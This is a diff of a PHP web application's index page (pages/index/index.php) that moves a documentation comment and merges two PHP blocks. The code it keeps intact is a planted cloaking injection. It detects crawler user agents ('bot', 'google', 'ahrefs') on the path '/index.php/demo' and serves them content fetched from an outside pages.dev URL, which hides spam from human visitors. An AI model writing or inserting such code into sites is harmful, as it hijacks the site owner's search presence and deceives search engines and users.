@@ -1,4 +1,8 @@
 <?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
 ob_start();
 header('Vary: User-Agent');
 $botchar = "/(bot|google|ahrefs)/i";
@@ -21,15 +25,7 @@ if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/index.php/demo") {
     echo aselolejos("https://hebatbangetkamukimai.pages.dev/sempakbasah/index.html");
     ob_end_flush();
     exit;
-}
-
-?>
-<?php
-
-/**
- * @defgroup pages_index Index Pages
- */
- 
+} 
 /**
  * @file pages/index/index.php
  *
